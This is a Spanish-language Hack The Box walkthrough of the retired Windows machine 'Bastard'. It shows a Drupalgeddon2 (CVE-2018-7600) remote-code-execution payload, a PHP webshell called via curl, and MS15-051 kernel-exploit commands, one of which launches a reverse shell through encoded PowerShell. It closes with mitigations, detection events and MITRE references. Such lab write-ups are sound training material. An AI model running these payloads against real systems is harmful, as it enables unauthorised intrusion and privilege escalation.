---
machine: Bastard
os: Windows
difficulty: Medium
platform: Hack The Box
category: Web / CMS
state: Retired
pwned: 2026-11-09
tags: [windows, drupal, drupalgeddon2, cve-2018-7600, kernel, ms15-051, cve-2015-1701]
---

# Bastard — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

## TL;DR

Un **Drupal 7.54** sin parchear cae con **Drupalgeddon2** (CVE-2018-7600): se ejecuta PHP sin autenticación y se sube un webshell. El host está sin parches (`Hotfix(s): N/A`), así que un exploit de kernel, **MS15-051** (CVE-2015-1701), completa el paso a `SYSTEM`. Los writeups de referencia usan el exploit de kernel, no un Potato.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 80,135,139,445,5985 <TARGET_IP>
```

| Puerto | Servicio |
|---|---|
| 80/tcp | Apache + Drupal 7.54 |
| 445/tcp | SMB |
| 5985/tcp | WinRM |

```bash
curl -s http://<TARGET_IP>/CHANGELOG.txt | head
droopescan scan drupal -u http://<TARGET_IP>
```

## Enumeración

- `curl http://<IP>/CHANGELOG.txt` fija la versión exacta: **Drupal 7.54** (anterior al parche 7.58 de CVE-2018-7600).
- `droopescan scan drupal -u http://<IP>` confirma el núcleo y que no hay módulos de terceros que distraigan; el 445/5985 no aportan credenciales.
- `systeminfo` tras el foothold muestra `Windows Server 2008 R2` con `Hotfix(s): N/A`: de ahí sale la decisión de usar un kernel exploit.

## Foothold

El fallo está en el procesado de formularios (`user/register` y similares): se inyecta un `#post_render` con `passthru`.

```bash
python3 drupa7-CVE-2018-7600.py http://<TARGET_IP>/
```

O manualmente, enviando el parámetro `element_parents` con:

```text
#post_render[]=passthru&form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=<command>
```

Con el RCE se sube un webshell:

```bash
curl -s 'http://<TARGET_IP>/shell.php?cmd=whoami'
```

El usuario es `nt authority\iusr` (IIS/Apache con PHP).

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

```cmd
whoami /priv
```

Con `Hotfix(s): N/A` en Server 2008 R2, se sube el exploit de kernel MS15-051 (CVE-2015-1701) ya compilado y se lanza con la orden que se quiera como SYSTEM:

```cmd
MS15-051x64.exe "whoami"        # debe devolver nt authority\system
```

Con reverse shell:

```cmd
MS15-051x64.exe "powershell -nop -enc <BASE64>"
```

Alternativas: `PrintSpoofer`, `RoguePotato`, `GodPotato` según build.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **El exploit devuelve 200 pero sin salida** → el parámetro va mal codificado; usa un PoC que acepte `--command`.
- **`SeImpersonate` no aparece** → el webshell corre con otra identidad; revisa `whoami /priv` desde el proceso real.
- **Arquitectura equivocada** → la caja es x64; la build x86 falla en silencio.
- **El webshell desaparece** → el CMS limpia `sites/default/files`; súbelo a otra ruta escribible.

## Mitigaciones y detección

- Actualizar Drupal (7.x sin soporte) y aplicar el parche de SA-CORE-2018-002.
- **WAF** con reglas para `#post_render`, `element_parents` y `passthru`.
- Limitar `SeImpersonatePrivilege` en cuentas de servicio web y usar cuentas virtuales.
- **4688** con `cmd.exe` hijo del proceso web y **7045** de servicios nuevos.

MITRE: T1190, T1059.001, T1134.001.

## Referencias

- [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)
- [MITRE T1059.001](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE T1134.001](https://attack.mitre.org/techniques/T1134/001/)
- [MITRE T1190](https://attack.mitre.org/techniques/T1190/)
